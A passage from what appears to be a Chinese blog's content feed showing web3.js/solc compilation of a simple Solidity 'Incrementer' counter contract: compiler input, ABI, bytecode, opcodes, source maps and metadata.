title="Input编译结果"></a>Input编译结果</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">language</span>: <span class="string">&#x27;Solidity&#x27;</span>,</span><br><span class="line">  <span class="attr">sources</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Incrementer.sol&#x27;</span>: &#123;</span><br><span class="line">      <span class="attr">content</span>: <span class="string">&#x27;//SPDX-License-Identifier: Unlicense\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;pragma solidity ^0.8.0;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;contract Incrementer &#123;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    uint256 public number;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    constructor(uint256 _initaNumer) &#123;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;        number = _initaNumer;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    &#125;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    function increment(uint256 _value) public &#123;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;        number = number + _value;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    &#125;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    function reset() public &#123;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;        number = 0;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    &#125;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    function getNumber() public view returns (uint256) &#123;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;        return number;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;    &#125;\r\n&#x27;</span> +</span><br><span class="line">        <span class="string">&#x27;&#125;\r\n&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">settings</span>: &#123; <span class="attr">outputSelection</span>: &#123; <span class="string">&#x27;*&#x27;</span>: [<span class="title class_">Object</span>] &#125; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tempFile"><a href="#tempFile" class="headerlink" title="tempFile"></a>tempFile</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">contracts</span>: &#123; <span class="string">&#x27;Incrementer.sol&#x27;</span>: &#123; <span class="title class_">Incrementer</span>: [<span class="title class_">Object</span>] &#125; &#125;,</span><br><span class="line">  <span class="attr">sources</span>: &#123; <span class="string">&#x27;Incrementer.sol&#x27;</span>: &#123; <span class="attr">id</span>: <span class="number">0</span> &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//[object]中放置的就是contractFile</span></span><br></pre></td></tr></table></figure><h3 id="contractFile"><a href="#contractFile" class="headerlink" title="contractFile"></a>contractFile</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">abi</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">inputs</span>: [<span class="title class_">Array</span>],</span><br><span class="line">      <span class="attr">stateMutability</span>: <span class="string">&#x27;nonpayable&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;constructor&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">inputs</span>: [],</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;getNumber&#x27;</span>,</span><br><span class="line">      <span class="attr">outputs</span>: [<span class="title class_">Array</span>],</span><br><span class="line">      <span class="attr">stateMutability</span>: <span class="string">&#x27;view&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">inputs</span>: [<span class="title class_">Array</span>],</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;increment&#x27;</span>,</span><br><span class="line">      <span class="attr">outputs</span>: [],</span><br><span class="line">      <span class="attr">stateMutability</span>: <span class="string">&#x27;nonpayable&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">inputs</span>: [],</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;number&#x27;</span>,</span><br><span class="line">      <span class="attr">outputs</span>: [<span class="title class_">Array</span>],</span><br><span class="line">      <span class="attr">stateMutability</span>: <span class="string">&#x27;view&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">inputs</span>: [],</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;reset&#x27;</span>,</span><br><span class="line">      <span class="attr">outputs</span>: [],</span><br><span class="line">      <span class="attr">stateMutability</span>: <span class="string">&#x27;nonpayable&#x27;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">devdoc</span>: &#123; <span class="attr">kind</span>: <span class="string">&#x27;dev&#x27;</span>, <span class="attr">methods</span>: &#123;&#125;, <span class="attr">version</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  <span class="attr">evm</span>: &#123;</span><br><span class="line">    <span class="attr">assembly</span>: </span><br><span class="line">    <span class="attr">bytecode</span>: &#123;</span><br><span class="line">      <span class="attr">generatedSources</span>: [<span class="title class_">Array</span>],</span><br><span class="line">      <span class="attr">linkReferences</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">object</span>: <span class="string">&#x27;608060405234801561001057600080fd5b506040516102d33803806102d383398181016040528101906100329190610054565b806000819055505061009e565b60008151905061004e81610087565b92915050565b60006020828403121561006657600080fd5b60006100748482850161003f565b91505092915050565b6000819050919050565b6100908161007d565b811461009b57600080fd5b50565b610226806100ad6000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80637cf5dab0146100515780638381f58a1461006d578063d826f88f1461008b578063f2c9ecd814610095575b600080fd5b61006b600480360381019061006691906100f7565b6100b3565b005b6100756100ca565b604051610082919061012f565b60405180910390f35b6100936100d0565b005b61009d6100d9565b6040516100aa919061012f565b60405180910390f35b806000546100c1919061014a565b60008190555050565b60005481565b60008081905550565b60008054905090565b6000813590506100f1816101d9565b92915050565b60006020828403121561010957600080fd5b6000610117848285016100e2565b91505092915050565b610129816101a0565b82525050565b60006020820190506101446000830184610120565b92915050565b6000610155826101a0565b9150610160836101a0565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610195576101946101aa565b5b828201905092915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6101e2816101a0565b81146101ed57600080fd5b5056fea2646970667358221220dc31f080c290bb2c97b3b4608162b86a2669d7894c2d9180d867cce6c3c3f9fd64736f6c63430008000033&#x27;</span>,</span><br><span class="line">      <span class="attr">opcodes</span>: <span class="string">&#x27;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x2D3 CODESIZE SUB DUP1 PUSH2 0x2D3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0x54 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP PUSH2 0x9E JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x4E DUP2 PUSH2 0x87 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x74 DUP5 DUP3 DUP6 ADD PUSH2 0x3F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x90 DUP2 PUSH2 0x7D JUMP JUMPDEST DUP2 EQ PUSH2 0x9B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x226 DUP1 PUSH2 0xAD PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7CF5DAB0 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x8381F58A EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0xD826F88F EQ PUSH2 0x8B JUMPI DUP1 PUSH4 0xF2C9ECD8 EQ PUSH2 0x95 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x66 SWAP2 SWAP1 PUSH2 0xF7 JUMP JUMPDEST PUSH2 0xB3 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x75 PUSH2 0xCA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x12F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x93 PUSH2 0xD0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9D PUSH2 0xD9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xAA SWAP2 SWAP1 PUSH2 0x12F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP1 PUSH1 0x0 SLOAD PUSH2 0xC1 SWAP2 SWAP1 PUSH2 0x14A JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xF1 DUP2 PUSH2 0x1D9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x109 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x117 DUP5 DUP3 DUP6 ADD PUSH2 0xE2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x129 DUP2 PUSH2 0x1A0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x144 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x120 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x155 DUP3 PUSH2 0x1A0 JUMP JUMPDEST SWAP2 POP PUSH2 0x160 DUP4 PUSH2 0x1A0 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x195 JUMPI PUSH2 0x194 PUSH2 0x1AA JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x1E2 DUP2 PUSH2 0x1A0 JUMP JUMPDEST DUP2 EQ PUSH2 0x1ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC BALANCE CREATE DUP1 0xC2 SWAP1 0xBB 0x2C SWAP8 0xB3 0xB4 PUSH1 0x81 PUSH3 0xB86A26 PUSH10 0xD7894C2D9180D867CCE6 0xC3 0xC3 0xF9 REVERT PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER &#x27;</span>,</span><br><span class="line">      <span class="attr">sourceMap</span>: <span class="string">&#x27;65:378:0:-:0;;;123:72;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;176:11;167:6;:20;;;;123:72;65:378;;7:143:1;;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;70:80;;;;:::o;156:284::-;;275:2;263:9;254:7;250:23;246:32;243:2;;;291:1;288;281:12;243:2;334:1;359:64;415:7;406:6;395:9;391:22;359:64;:::i;:::-;349:74;;305:128;233:207;;;;:::o;446:77::-;;512:5;501:16;;491:32;;;:::o;529:122::-;602:24;620:5;602:24;:::i;:::-;595:5;592:35;582:2;;641:1;638;631:12;582:2;572:79;:::o;65:378:0:-;;;;;;;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">deployedBytecode</span>: &#123;</span><br><span class="line">      <span class="attr">generatedSources</span>: [<span class="title class_">Array</span>],</span><br><span class="line">      <span class="attr">immutableReferences</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">linkReferences</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">object</span>: <span class="string">&#x27;608060405234801561001057600080fd5b506004361061004c5760003560e01c80637cf5dab0146100515780638381f58a1461006d578063d826f88f1461008b578063f2c9ecd814610095575b600080fd5b61006b600480360381019061006691906100f7565b6100b3565b005b6100756100ca565b604051610082919061012f565b60405180910390f35b6100936100d0565b005b61009d6100d9565b6040516100aa919061012f565b60405180910390f35b806000546100c1919061014a565b60008190555050565b60005481565b60008081905550565b60008054905090565b6000813590506100f1816101d9565b92915050565b60006020828403121561010957600080fd5b6000610117848285016100e2565b91505092915050565b610129816101a0565b82525050565b60006020820190506101446000830184610120565b92915050565b6000610155826101a0565b9150610160836101a0565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115610195576101946101aa565b5b828201905092915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6101e2816101a0565b81146101ed57600080fd5b5056fea2646970667358221220dc31f080c290bb2c97b3b4608162b86a2669d7894c2d9180d867cce6c3c3f9fd64736f6c63430008000033&#x27;</span>,   </span><br><span class="line">      <span class="attr">opcodes</span>: <span class="string">&#x27;PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x7CF5DAB0 EQ PUSH2 0x51 JUMPI DUP1 PUSH4 0x8381F58A EQ PUSH2 0x6D JUMPI DUP1 PUSH4 0xD826F88F EQ PUSH2 0x8B JUMPI DUP1 PUSH4 0xF2C9ECD8 EQ PUSH2 0x95 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x6B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x66 SWAP2 SWAP1 PUSH2 0xF7 JUMP JUMPDEST PUSH2 0xB3 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x75 PUSH2 0xCA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x82 SWAP2 SWAP1 PUSH2 0x12F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x93 PUSH2 0xD0 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9D PUSH2 0xD9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xAA SWAP2 SWAP1 PUSH2 0x12F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST DUP1 PUSH1 0x0 SLOAD PUSH2 0xC1 SWAP2 SWAP1 PUSH2 0x14A JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0xF1 DUP2 PUSH2 0x1D9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x109 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x117 DUP5 DUP3 DUP6 ADD PUSH2 0xE2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x129 DUP2 PUSH2 0x1A0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x144 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x120 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x155 DUP3 PUSH2 0x1A0 JUMP JUMPDEST SWAP2 POP PUSH2 0x160 DUP4 PUSH2 0x1A0 JUMP JUMPDEST SWAP3 POP DUP3 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SUB DUP3 GT ISZERO PUSH2 0x195 JUMPI PUSH2 0x194 PUSH2 0x1AA JUMP JUMPDEST JUMPDEST DUP3 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x1E2 DUP2 PUSH2 0x1A0 JUMP JUMPDEST DUP2 EQ PUSH2 0x1ED JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDC BALANCE CREATE DUP1 0xC2 SWAP1 0xBB 0x2C SWAP8 0xB3 0xB4 PUSH1 0x81 PUSH3 0xB86A26 PUSH10 0xD7894C2D9180D867CCE6 0xC3 0xC3 0xF9 REVERT PUSH5 0x736F6C6343 STOP ADDMOD STOP STOP CALLER &#x27;</span>,</span><br><span class="line">      <span class="attr">sourceMap</span>: <span class="string">&#x27;65:378:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;203:85;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;93:21;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;296:53;;;:::i;:::-;;357:83;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;203:85;274:6;265;;:15;;;;:::i;:::-;256:6;:24;;;;203:85;:::o;93:21::-;;;;:::o;296:53::-;340:1;331:6;:10;;;;296:53::o;357:83::-;399:7;426:6;;419:13;;357:83;:::o;7:139:1:-;;91:6;78:20;69:29;;107:33;134:5;107:33;:::i;:::-;59:87;;;;:::o;152:262::-;;260:2;248:9;239:7;235:23;231:32;228:2;;;276:1;273;266:12;228:2;319:1;344:53;389:7;380:6;369:9;365:22;344:53;:::i;:::-;334:63;;290:117;218:196;;;;:::o;420:118::-;507:24;525:5;507:24;:::i;:::-;502:3;495:37;485:53;;:::o;544:222::-;;675:2;664:9;660:18;652:26;;688:71;756:1;745:9;741:17;732:6;688:71;:::i;:::-;642:124;;;;:::o;772:305::-;;831:20;849:1;831:20;:::i;:::-;826:25;;865:20;883:1;865:20;:::i;:::-;860:25;;1019:1;951:66;947:74;944:1;941:81;938:2;;;1025:18;;:::i;:::-;938:2;1069:1;1066;1062:9;1055:16;;816:261;;;;:::o;1083:77::-;;1149:5;1138:16;;1128:32;;;:::o;1166:180::-;1214:77;1211:1;1204:88;1311:4;1308:1;1301:15;1335:4;1332:1;1325:15;1352:122;1425:24;1443:5;1425:24;:::i;:::-;1418:5;1415:35;1405:2;;1464:1;1461;1454:12;1405:2;1395:79;:::o&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">gasEstimates</span>: &#123; <span class="attr">creation</span>: [<span class="title class_">Object</span>], <span class="attr">external</span>: [<span class="title class_">Object</span>] &#125;,</span><br><span class="line">    <span class="attr">legacyAssembly</span>: &#123; <span class="string">&#x27;.code&#x27;</span>: [<span class="title class_">Array</span>], <span class="string">&#x27;.data&#x27;</span>: [<span class="title class_">Object</span>] &#125;,</span><br><span class="line">    <span class="attr">methodIdentifiers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;getNumber()&#x27;</span>: <span class="string">&#x27;f2c9ecd8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;increment(uint256)&#x27;</span>: <span class="string">&#x27;7cf5dab0&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;number()&#x27;</span>: <span class="string">&#x27;8381f58a&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;reset()&#x27;</span>: <span class="string">&#x27;d826f88f&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">ewasm</span>: &#123; <span class="attr">wasm</span>: <span class="string">&#x27;&#x27;</span> &#125;,</span><br><span class="line">  <span class="attr">metadata</span>: <span class="string">&#x27;&#123;&quot;compiler&quot;:&#123;&quot;version&quot;:&quot;0.8.0+commit.c7dfd78e&quot;&#125;,&quot;language&quot;:&quot;Solidity&quot;,&quot;output&quot;:&#123;&quot;abi&quot;:[&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;_initaNumer&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;getNumber&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;_value&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;increment&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;number&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;reset&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;],&quot;devdoc&quot;:&#123;&quot;kind&quot;:&quot;dev&quot;,&quot;methods&quot;:&#123;&#125;,&quot;version&quot;:1&#125;,&quot;userdoc&quot;:&#123;&quot;kind&quot;:&quot;user&quot;,&quot;methods&quot;:&#123;&#125;,&quot;version&quot;:1&#125;&#125;,&quot;settings&quot;:&#123;&quot;compilationTarget&quot;:&#123;&quot;Incrementer.sol&quot;:&quot;Incrementer&quot;&#125;,&quot;evmVersion&quot;:&quot;istanbul&quot;,&quot;libraries&quot;:&#123;&#125;,&quot;metadata&quot;:&#123;&quot;bytecodeHash&quot;:&quot;ipfs&quot;&#125;,&quot;optimizer&quot;:&#123;&quot;enabled&quot;:false,&quot;runs&quot;:200&#125;,&quot;remappings&quot;:[]&#125;,&quot;sources&quot;:&#123;&quot;Incrementer.sol&quot;:&#123;&quot;keccak256&quot;:&quot;0xd980fe0b2c634f1f2431b62181463ba4be9642d8a169ce254294bdbf823d0bc7&quot;,&quot;license&quot;:&quot;Unlicense&quot;,&quot;urls&quot;:[&quot;bzz-raw://1594f6025a91675a496dc0a122c83d5fd2fc2b1cf56c60b1c96f386f5acc6dea&quot;,&quot;dweb:/ipfs/QmVgGTrGWMZu1MiRzPyu61DQMjWnJoNfSfbaVc2PPDkC7b&quot;]&#125;&#125;,&quot;version&quot;:1&#125;&#x27;</span>,</span><br><span class="line">  <span class="attr">storageLayout</span>: &#123; <span class="attr">storage</span>: [ [<span class="title class_">Object</span>] ], <span class="attr">types</span>: &#123; <span class="attr">t_uint256</span>: [<span class="title class_">Object</span>] &#125; &#125;,</span><br><span class="line">  <span class="attr">userdoc</span>: &#123; <span class="attr">kind</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">methods</span>: &#123;&#125;, <span class="attr">version</span>: <span class="number">1</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -web3.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UniswapV2</title>
      <link href="/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/UniswapV2/"/>
      <url>/2023/07/22/solidity/%E7%B2%BE%E5%8D%8E/UniswapV2/</url>
      
